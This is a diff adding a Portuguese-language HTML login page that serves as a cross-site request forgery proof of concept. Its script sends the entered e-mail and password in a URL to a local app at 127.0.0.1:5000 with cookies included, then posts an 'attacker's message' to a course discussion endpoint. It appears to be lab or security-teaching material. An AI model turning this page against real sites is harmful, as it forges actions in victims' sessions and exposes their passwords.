@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login no Sistema</h2>
+    <form id="loginForm">
+        <label for="email">E-mail:</label><br>
+        <input type="text" id="email" name="email" required><br><br>
+
+        <label for="password">Senha:</label><br>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <button type="submit">Entrar</button>
+    </form>
+    <p id="status"></p>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const status = document.getElementById("status");
+            const email = encodeURIComponent(document.getElementById("email").value);
+            const password = encodeURIComponent(document.getElementById("password").value);
+            const loginUrl = `http://127.0.0.1:5000/login?email=${email}&password=${password}`;
+
+            const formData = new FormData();
+            formData.append("body", "Mensagem do atacante!");
+
+            try {
+                status.textContent = "Autenticando...";
+                await fetch(loginUrl, {
+                    method: "GET",
+                    mode: "no-cors",
+                    credentials: "include"
+                });
+
+                status.textContent = "Publicando mensagem...";
+                await fetch("http://127.0.0.1:5000/disciplina/1/mensagem", {
+                    method: "POST",
+                    body: formData,
+                    mode: "no-cors",
+                    credentials: "include"
+                });
+
+                status.textContent = "Processo concluído.";
+            } catch (erro) {
+                status.textContent = "Erro ao conectar com o servidor.";
+            }
+        });
+    </script>
+</body>
+</html>
